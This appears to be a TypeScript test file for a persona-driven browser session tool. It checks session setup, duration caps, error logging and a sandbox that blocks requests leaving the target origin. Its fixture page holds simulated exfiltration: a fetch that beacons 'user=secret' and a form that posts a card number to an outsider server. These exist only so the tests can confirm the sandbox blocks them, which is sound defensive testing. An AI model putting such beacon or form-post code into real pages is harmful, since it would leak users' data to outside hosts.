// hauntSpawn against a real HTTP origin: what the session is configured with,
// what it records during the initial load, and the sandbox cases that need
// more than one origin. spawn.test.ts covers launch/teardown on data: URLs.
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { type Server, createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import {
  type FixtureApp,
  startFixtureApp,
} from '../test-support/fixture-app.js';
import { SESSION_MAX_ACTIVE_DURATION_MS } from './constants.js';
import { hauntNavigate } from './navigate.js';
import { SessionManager } from './session/manager.js';
import { hauntSpawn } from './spawn.js';

const __dirname = fileURLToPath(new URL('.', import.meta.url));
const VALID_PERSONA = resolve(
  __dirname,
  './persona/__fixtures__/valid-persona.yaml',
);
const CONFUSED_BEGINNER = resolve(
  __dirname,
  '../../../personas/confused-beginner.yaml',
);

function listen(server: Server): Promise<string> {
  return new Promise((r) =>
    server.listen(0, '127.0.0.1', () =>
      r(`http://127.0.0.1:${(server.address() as AddressInfo).port}`),
    ),
  );
}

function close(server: Server): Promise<void> {
  server.closeAllConnections();
  return new Promise((r) => server.close(() => r()));
}

describe('hauntSpawn (real origin)', () => {
  let app: FixtureApp;
  let manager: SessionManager;
  let tmp: string;

  beforeAll(async () => {
    app = await startFixtureApp();
    tmp = mkdtempSync(join(tmpdir(), 'haunt-spawn-'));
  });

  afterAll(async () => {
    await app.close();
    rmSync(tmp, { recursive: true, force: true });
  });

  afterEach(async () => {
    for (const session of manager?.all() ?? []) {
      await session.browser.close();
    }
  });

  it('returns the persona system prompt for the orchestrator to roleplay', async () => {
    manager = new SessionManager();
    const result = await hauntSpawn(manager, {
      persona: CONFUSED_BEGINNER,
      target_url: app.baseUrl,
    });

    expect(result.persona_name).toBe('Confused Beginner');
    expect(result.persona_description).toContain(
      'You are a non-technical user',
    );
    expect(result.persona_goal).toBe(
      'Do the unexpected and find what breaks or gives no feedback',
    );
  });

  it("applies the persona's viewport and locale to the browser", async () => {
    manager = new SessionManager();
    const { session_id } = await hauntSpawn(manager, {
      persona: CONFUSED_BEGINNER,
      target_url: app.baseUrl,
    });
    const { page } = manager.get(session_id);

    expect(page.viewportSize()).toEqual({ width: 1366, height: 768 });
    expect(await page.evaluate(() => navigator.language)).toBe('en-US');
  });

  it('falls back to a 1280x720 viewport and 30 steps when the persona sets neither', async () => {
    const personaPath = join(tmp, 'bare.yaml');
    writeFileSync(
      personaPath,
      'name: Bare\ndescription: d\nsystem_prompt: p\nbrowser:\n  headless: true\n',
    );
    manager = new SessionManager();
    const result = await hauntSpawn(manager, {
      persona: personaPath,
      target_url: app.baseUrl,
    });
    const session = manager.get(result.session_id);

    expect(session.page.viewportSize()).toEqual({ width: 1280, height: 720 });
    expect(session.max_steps).toBe(30);
    expect(result.persona_goal).toBe('Explore the application freely');
  });

  it('starts the session with zeroed counters and the default duration cap', async () => {
    manager = new SessionManager();
    const before = Date.now();
    const { session_id } = await hauntSpawn(manager, {
      persona: VALID_PERSONA,
      target_url: app.baseUrl,
    });
    const session = manager.get(session_id);

    expect(session.step_count).toBe(0);
    expect(session.issues).toEqual([]);
    expect(session.sandbox_blocked_requests).toEqual([]);
    expect(session.pages_visited).toEqual([app.baseUrl]);
    expect(session.start_time).toBeGreaterThanOrEqual(before);
    expect(session.max_active_duration_ms).toBe(SESSION_MAX_ACTIVE_DURATION_MS);
  });

  it('lets a caller override the duration cap', async () => {
    manager = new SessionManager();
    const { session_id } = await hauntSpawn(manager, {
      persona: VALID_PERSONA,
      target_url: app.baseUrl,
      max_active_duration_ms: 1,
    });
    await new Promise((r) => setTimeout(r, 10));

    await expect(
      hauntNavigate(manager, { session_id, action: `goto ${app.baseUrl}` }),
    ).rejects.toThrow(/active-duration cap \(1ms\)/);
  });

  it('records console errors and failed requests raised by the initial load', async () => {
    manager = new SessionManager();
    const { session_id } = await hauntSpawn(manager, {
      persona: VALID_PERSONA,
      target_url: `${app.baseUrl}/broken`,
    });
    const session = manager.get(session_id);

    expect(session.console_errors).toContain('boom from fixture');
    expect(session.network_errors).toEqual([
      expect.stringContaining(`GET ${app.baseUrl}/dead`),
    ]);
    // A failed request on the app's own origin is an app failure, not a block.
    expect(session.sandbox_blocked_requests).toEqual([]);
  });

  it('gives each session its own browser', async () => {
    manager = new SessionManager();
    const [a, b] = await Promise.all([
      hauntSpawn(manager, { persona: VALID_PERSONA, target_url: app.baseUrl }),
      hauntSpawn(manager, { persona: VALID_PERSONA, target_url: app.baseUrl }),
    ]);

    expect(manager.get(a.session_id).browser).not.toBe(
      manager.get(b.session_id).browser,
    );
    expect(manager.all()).toHaveLength(2);
  });
});

describe('sandboxing — requests made by the page itself', () => {
  let target: Server;
  let outsider: Server;
  let targetUrl: string;
  let outsiderUrl: string;
  const outsiderRequests: string[] = [];
  let manager: SessionManager;

  beforeAll(async () => {
    outsider = createServer((req, res) => {
      outsiderRequests.push(`${req.method} ${req.url}`);
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.end('outsider');
    });
    outsiderUrl = await listen(outsider);

    target = createServer((req, res) => {
      if (req.url === '/bad-redirect') {
        res.writeHead(302, { Location: 'http://[not-a-host' });
        res.end();
        return;
      }
      res.setHeader('Content-Type', 'text/html');
      res.end(`<title>target</title>
        <button onclick="fetch('${outsiderUrl}/beacon?user=secret').catch(() => {}).finally(() => { document.title = 'sent'; })">Track me</button>
        <form method="post" action="${outsiderUrl}/collect">
          <input name="card" value="4242" />
          <button type="submit">Pay</button>
        </form>`);
    });
    targetUrl = await listen(target);
  });

  afterAll(async () => {
    await Promise.all([close(target), close(outsider)]);
  });

  afterEach(async () => {
    for (const session of manager?.all() ?? []) {
      await session.browser.close();
    }
    outsiderRequests.length = 0;
  });

  it('blocks a background fetch to a new origin without failing the action', async () => {
    manager = new SessionManager();
    const { session_id } = await hauntSpawn(manager, {
      persona: VALID_PERSONA,
      target_url: targetUrl,
    });
    const session = manager.get(session_id);

    await hauntNavigate(manager, { session_id, action: 'click Track me' });
    await session.page.waitForFunction(() => document.title === 'sent');

    expect(outsiderRequests).toEqual([]);
    // Query string stripped: it is the part most likely to carry user data.
    expect(session.sandbox_blocked_requests).toEqual([
      `GET ${outsiderUrl}/beacon`,
    ]);
    expect(session.network_errors).toEqual([]);
    expect(session.issues).toEqual([]);
  });

  it('blocks a form post to a new origin', async () => {
    manager = new SessionManager();
    const { session_id } = await hauntSpawn(manager, {
      persona: VALID_PERSONA,
      target_url: targetUrl,
    });

    const result = await hauntNavigate(manager, {
      session_id,
      action: 'click Pay',
    });
    const session = manager.get(session_id);
    await expect
      .poll(() => session.sandbox_blocked_requests)
      .toEqual([`POST ${outsiderUrl}/collect`]);

    expect(result.success).toBe(true);
    expect(outsiderRequests).toEqual([]);
    expect(session.issues).toEqual([]);
  });

  it('blocks a redirect whose Location cannot be parsed', async () => {
    manager = new SessionManager();
    const { session_id } = await hauntSpawn(manager, {
      persona: VALID_PERSONA,
      target_url: targetUrl,
    });

    const result = await hauntNavigate(manager, {
      session_id,
      action: `goto ${targetUrl}/bad-redirect`,
    });

    expect(result.success).toBe(false);
    expect(result.sandbox_blocked).toEqual([
      `GET ${targetUrl}/bad-redirect -> http://[not-a-host (unparseable redirect target)`,
    ]);
    expect(manager.get(session_id).issues).toEqual([]);
  });

  it('builds a separate allowlist for each session', async () => {
    manager = new SessionManager();
    // This session's target IS the "outsider" — so for it, that origin is home.
    const { session_id } = await hauntSpawn(manager, {
      persona: VALID_PERSONA,
      target_url: outsiderUrl,
    });

    const result = await hauntNavigate(manager, {
      session_id,
      action: `goto ${outsiderUrl}/again`,
    });
    expect(result.success).toBe(true);

    const blocked = await hauntNavigate(manager, {
      session_id,
      action: `goto ${targetUrl}`,
    });
    expect(blocked.success).toBe(false);
    expect(blocked.sandbox_blocked).toEqual([`GET ${targetUrl}/`]);
  });
});
